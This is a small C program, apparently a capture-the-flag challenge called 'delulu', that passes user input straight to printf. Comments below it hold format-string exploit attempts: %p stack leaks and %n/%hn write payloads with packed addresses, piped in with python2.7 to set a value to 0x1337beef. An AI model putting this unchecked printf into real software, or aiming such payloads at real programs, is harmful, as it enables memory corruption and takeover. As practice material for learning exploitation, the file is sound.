#include <stdio.h>
#include <unistd.h>

int main() {
    int secret_num = 0x8badf00d;

    char name[64] = {'A'};
    read(0, name, 64);
    printf("Hello ");
    printf((char *)&name);
    printf("! You'll never get my secret!\n");
    return 0;
}
//AAAAAAAAAAAAAAA%p%p%p%p%p%p%p%p
//AAAABBBB %8$p
//\xef\xbe7\x13 %8$p

// AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  0x7ffe58846190 : 322420463
/*
python2.7 -c 'print "\xef\xbe\x37\x13\x00\x00\x00\x00 %8$p"' | ./delulu
python2.7 -c 'print "AAAA%7$08n" + "\xf0\xdb\xff\xff\xff\x7f\x00\x00"' | ./delulu
python2.7 -c 'print "AAAABBBB %8$p"' | ./delulu
python2.7 -c 'print "123%8$n"' | ./delulu

python2.7 -c 'print "AAAA%7$hn" + "\xf0\xdb\xff\xff\xff\x7f\x00\x00"' | ./delulu

python2.7 -c 'print "%48879x%7$hn" + "\xef\xbe\x37\x13\x00\x00\x00\x00"' | ./delulu
0x00007fffffffdbf0

0x1337beef
*/